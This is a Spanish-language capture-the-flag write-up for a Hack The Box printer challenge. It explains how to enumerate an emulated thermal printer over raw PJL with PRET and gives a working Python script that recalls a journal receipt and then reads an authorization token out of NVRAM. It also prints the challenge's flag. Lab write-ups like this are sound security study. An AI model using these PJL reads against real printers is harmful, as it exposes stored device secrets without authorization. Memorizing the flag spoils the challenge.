# Thermal Receipt: Writeup / Solucionario

**Categoría:** Printer / Hardware (PJL)
**Target:** `154.57.164.79:30581`
**Flag:** `HTB{th3rm4l_j0urn4l_r3c4ll_33ff868a8061e6dfc7e9c0265ddba5bd}`

---

## Resumen

El servicio expone un protocolo de impresora en crudo (RiverGate RG-T80II, impresora
térmica de recibos). El punto de entrada es **PRET en modo PJL**. La flag es un token de
autorización de 60 bytes guardado en NVRAM, pero el valor sale en **ceros** salvo que
primero se "recuerde" (recall) la transacción leyendo el recibo del journal **en la misma
conexión**. De ahí el nombre: `th3rm4l_j0urn4l_r3c4ll`.

## 1. Reconocimiento

El puerto habla PJL. Framing PJL (importante replicarlo para que el emulador responda):

```
\x1b%-12345X @PJL <cmd>\r\n @PJL ECHO <token>\r\n\r\n \x1b%-12345X
```

Con PRET:

```bash
git clone --depth1 https://github.com/RUB-NDS/PRET.git
printf 'id\ninfo id\nls\nquit\n' | python3 pret.py 154.57.164.79:30581 pjl -q
```

- `id` → `RiverGate RG-T80II Thermal Receipt Printer`
- `ls` → `config/`, `journal/`, `spool/`, `readme.txt`

## 2. Explorar el sistema de archivos

```
config/device.txt   -> MODEL=RG-T80II ... EJOURNAL=ON
                       LAST_CLOSED_SLOT=NVRAM:EJ_LAST
journal/last.txt    -> "receipt_0003.txt"           (último slot cerrado)
journal/receipt_0000..0002.txt -> AUTH CODE en claro (RG-xxxx-OK)
journal/receipt_0003.txt:
    GATE: ASH-03  CARGO: BRINE FILTERS
    AUTH CODE: STORED IN NVRAM
    NVRAM REF: EJ_AUTH_0421 ADDR=53264 LEN=60
```

La transacción objetivo (ASH-03) tiene su AUTH guardado en NVRAM en `ADDR=53264 LEN=60`.

## 3. Leer NVRAM: primero solo ceros

`@PJL RNVRAM ADDRESS=53264` → `DATA=0`. Un escaneo completo de toda la NVRAM
(0-59647, batch ≤100 por conexión por un límite del emulador) solo revela **strings de
nombres**, no el valor:

```
@512   MODEL=RG-T80II / FW=3.18 / EJOURNAL=ON
@32768 EJ_LAST=0:/journal/receipt_0003.txt
@53248 EJ_AUTH_0421        <- solo el NOMBRE; el valor en 53264 está en ceros
```

El valor fue "stripped" (según la narrativa, los clerks vaciaron el terminal).

## 4. El truco: recall de la transacción en la misma sesión

Pista del enunciado: *"If the printer still remembers the right transaction, it may hold
the authorization token."* El valor de NVRAM se **rellena de forma stateful** cuando se
lee (FSUPLOAD) el recibo del journal, pero solo dentro de **la misma conexión TCP**.

Secuencia en una sola conexión:

1. `@PJL FSUPLOAD NAME="0:/journal/receipt_0003.txt" OFFSET=0 SIZE=241`  ← recall
2. `@PJL RNVRAM ADDRESS=53264` … hasta `53323`  ← ahora devuelve el token

## 5. Exploit

```python
import socket, re
HOST, PORT = "154.57.164.79", 30581
UEL=b"\x1b%-12345X"; EOL=b"\r\n"; TOK=b"DELIMITER31337"

def session(lines, wait=8):
    s=socket.socket(); s.settimeout(wait); s.connect((HOST,PORT))
    s.sendall(UEL+EOL.join(lines)+EOL+b"@PJL ECHO "+TOK+EOL+EOL+UEL)
    d=b""
    try:
        while True:
            c=s.recv(65536)
            if not c: break
            d+=c
            if TOK in d: break
    except socket.timeout: pass
    s.close(); return d.decode('latin1')

reads=[b"@PJL RNVRAM ADDRESS=%d"%a for a in range(53264,53264+60)]
r=session([b'@PJL FSUPLOAD NAME="0:/journal/receipt_0003.txt" OFFSET=0 SIZE=241']+reads)
d={int(a):int(v) for a,v in re.findall(r"ADDRESS=(\d+)\s+DATA=(\d+)", r)}
print(bytes(d.get(a,0) for a in range(53264,53264+60)).decode())
```

Salida:

```
HTB{th3rm4l_j0urn4l_r3c4ll_33ff868a8061e6dfc7e9c0265ddba5bd}
```

## Notas / gotchas

- Hay que replicar el framing PJL exacto (UEL + `@PJL ECHO` como delimitador + UEL final)
  o el emulador no responde.
- El emulador limita ~100 respuestas RNVRAM por conexión; para escanear usar batches ≤90
  con reintentos.
- ESC/POS y PCL aparecen en `CMDSET` pero son cosméticos: no responden.
- La clave del reto es el **estado por sesión**: recall (leer el recibo) + lectura NVRAM
  deben ir en la **misma** conexión.
